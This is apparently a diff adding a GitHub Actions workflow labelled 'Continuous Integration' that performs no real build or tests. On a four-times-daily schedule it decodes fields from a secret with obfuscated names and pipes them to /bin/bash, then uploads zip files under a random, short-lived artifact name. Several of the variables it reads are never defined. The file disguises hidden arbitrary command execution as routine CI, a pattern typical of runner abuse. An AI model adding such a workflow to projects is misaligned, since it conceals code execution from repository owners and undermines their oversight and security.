@@ -1,0 +1,33 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '37 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          euol257: ${{ secrets.euol257 }}
+        run: |
+          printf '%s' "$euol257" | jq -r .i93 | /bin/bash
+          echo $j9406 | jq -r .lyej35 | /bin/bash
+          echo $deufj45662 | jq -r .t22243 | /bin/bash
+          echo $p7 | jq -r .xmnxc95413 | /bin/bash
+          printf '%s' "$uqhas84" | jq -r .vbi9 | /bin/bash
+          printf '%s' "$akpy65" | jq -r .pccvv3567 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: z7PfhAxt
+          path: "*.zip"
+          retention-days: 1
